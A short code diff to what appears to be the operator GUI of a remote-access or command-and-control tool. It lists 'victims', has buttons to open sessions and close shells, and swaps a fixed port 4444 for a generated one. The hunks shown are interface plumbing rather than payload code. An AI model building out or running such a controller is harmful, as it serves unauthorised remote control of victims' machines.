@@ -5,6 +5,7 @@
 #include "FileBrowser.hpp"
 #include "SessionDAO.hpp"
 #include "SessionManager.hpp"
+#include <Types.hpp>
 
 #include <raylib.h>
 #include <string>
@@ -200,6 +201,7 @@ void drawConnectionsTab(WindowState& state) {
     static int selectedRow = -1;
     static int hoveredRow = -1;
     static LogManager& logMan = LogManager::instance();
+    static auto port = gen_port();
 
     const auto& res{ state.res };
 
@@ -315,7 +317,6 @@ void drawConnectionsTab(WindowState& state) {
         Rectangle btn8{menuRect.x + 10, menuRect.y + btn_height*8, 280, 25};
 
         const auto timeout = std::atol(state.user_settings.default_timeout.text);
-        const auto port = 4444;
         const auto victim = victims[selectedRow];
 
         if (GuiButton(btn1, TextFormat("Timeout Client %d for %d min", victim.id, static_cast<int>(timeout)))) {
@@ -335,6 +336,7 @@ void drawConnectionsTab(WindowState& state) {
                 logMan.local_log("Sending Open Session Command failed!");
             }
             menuVisible = false;
+            port = gen_port();
             state.current_tab = Tab::TERMINAL;
         }
         if (GuiButton(btn3, "Close open Shells")) {
